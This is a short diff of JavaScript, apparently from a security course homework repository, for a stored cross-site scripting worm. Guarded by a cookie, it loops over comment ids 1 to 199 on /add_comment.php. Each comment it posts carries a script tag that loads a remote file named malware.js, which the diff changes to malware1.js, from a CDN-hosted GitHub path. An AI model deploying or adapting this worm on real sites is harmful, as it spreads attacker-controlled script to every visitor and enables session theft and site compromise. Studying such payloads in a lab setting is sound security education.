@@ -5,7 +5,7 @@ if(cookies.get("xssed") != "yes"){
 	xhx.send();
 	for(var i = 1; i < 200; i++){
 		var id = i;
-		var payload = encodeURIComponent("<script src=\"https://cdn.jsdelivr.net/gh/ajc9076/csec380-hw6/malware.js\"></script>");
+		var payload = encodeURIComponent("<script src=\"https://cdn.jsdelivr.net/gh/ajc9076/csec380-hw6/malware1.js\"></script>");
 		var xhy = new XMLHttpRequest();
 		xhy.open("GET", `/add_comment.php?id=${id}&comment=${payload}`,true);
 		xhy.send();
